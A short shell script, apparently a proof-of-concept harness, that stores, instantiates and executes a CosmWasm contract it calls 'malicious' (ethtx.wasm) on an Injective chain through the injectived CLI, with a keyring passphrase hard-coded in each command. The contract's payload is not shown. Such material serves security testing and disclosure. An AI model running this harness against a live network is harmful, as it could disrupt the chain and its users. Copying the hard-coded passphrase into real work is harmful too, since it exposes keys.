#!/bin/sh

# define home dir and code location
export INJHOME=$(pwd)/injhome
export CONTRACT="./artifacts/ethtx.wasm"

echo "Deploying malicious contract"
echo 12345678 | injectived  tx wasm store $CONTRACT --home $INJHOME  --from user1 --chain-id injective-1  --fees 3788570inj --gas auto --gas-adjustment 1.3 --keyring-dir $INJHOME --keyring-backend "file" -y
sleep 5

echo "Instantiating malicious contract"
TX_HASH=$(echo 12345678 | injectived  tx wasm instantiate 1 "{}"  --gas 2000000 --fees 5788570inj --home $INJHOME  --from user1 --chain-id injective-1 --label "eth" --no-admin --keyring-dir $INJHOME --keyring-backend "file" -y| grep "txhash:" | cut -f2 -d' ')
echo "Instantiated in TX $TX_HASH"
sleep 5

# get the address and run it
CONTRACT_ADDR=$(injectived q tx $TX_HASH -o json | jq -r '.events[] | select(.type == "cosmwasm.wasm.v1.EventContractInstantiated").attributes[] | select(.key == "contract_address").value | fromjson')
echo "Calling malicious contract $CONTRACT_ADDR"
echo 12345678 |  injectived tx wasm execute $CONTRACT_ADDR "{}"  --gas 2000000 --fees 5788570inj --home $INJHOME  --from user1 --chain-id injective-1 --keyring-dir $INJHOME --keyring-backend "file" -y